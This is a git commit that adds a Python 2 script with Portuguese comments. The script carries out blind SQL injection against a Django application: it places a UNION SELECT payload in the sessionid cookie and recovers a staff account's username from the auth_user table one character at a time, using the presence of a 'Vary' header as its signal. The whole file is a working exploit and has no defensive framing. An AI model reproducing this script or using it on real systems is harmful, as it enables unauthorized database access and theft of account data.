2a7d4f5c496b116854549ec2b7d4d2ef2e6fd7cd
Rafael Caricio <rafael.jacinto@gmail.com>
2010-11-07 18:42:42 -0300

    Go

---
+++ inject_and_translate.py
@@ -0,0 +1,28 @@
+# -*- ecoding:utf-8 -*-
+
+import urllib2
+from string import ascii_lowercase, digits
+
+def inject(sql):
+    """Injeta o commando SQL no cookie da requisição."""
+    r = urllib2.Request("http://localhost")
+    r.add_header("Cookie", "sessionid=' UNION %s" % sql.replace("\n", " ").strip())
+    return urllib2.urlopen(r)
+
+def verify(response):
+    """Verifica a existência da variável cookie no cabecalho HTTP.
+       Essa variável indica que a resposta é do django."""
+    return "Vary" in response.headers
+
+if __name__ == "__main__":
+    cur_pos = 1
+    username = ""
+    max_number_of_django_auth_username = 30
+    for interation in xrange(max_number_of_django_auth_username):
+        for letter_or_digit in ascii_lowercase + digits + "@._":
+            response = inject("SELECT CASE STRCMP(LOWER(SUBSTRING(username,%(i)d,1)),'%(char)s') WHEN 0 THEN CONCAT(email,'ABigDataHereFakeUserLoggedinABigDataHereABigDataHer') ELSE email END FROM auth_user WHERE is_staff ORDER BY 1,'1" % {"char": letter_or_digit,
+                              "i": interation })
+            if verify(response):
+                username += letter_or_digit
+                break
+    print "username:", username
